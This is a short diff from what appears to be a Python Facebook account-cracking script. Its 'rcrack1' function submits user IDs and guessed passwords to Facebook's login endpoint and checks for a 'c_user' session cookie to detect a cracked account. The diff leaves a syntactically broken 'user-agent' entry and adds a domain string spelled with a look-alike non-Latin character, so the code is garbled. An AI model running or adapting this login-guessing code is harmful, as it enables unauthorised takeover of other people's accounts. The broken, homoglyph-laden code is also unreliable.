@@ -235,8 +235,14 @@ def rcrack1(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
-    'x-client-data': 'CLWWywEIk9vMAQ==',}
+    'user-agent': }
+    params = {
+    'q': 'web.facebook.cοm',
+    'oq': '',
+    'aqs': 'chrome.4.69i177j69i59i450l4.-1j0j1',
+    'sourceid': 'chrome-mobile',
+    'ie': 'UTF-8',
+}
             lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
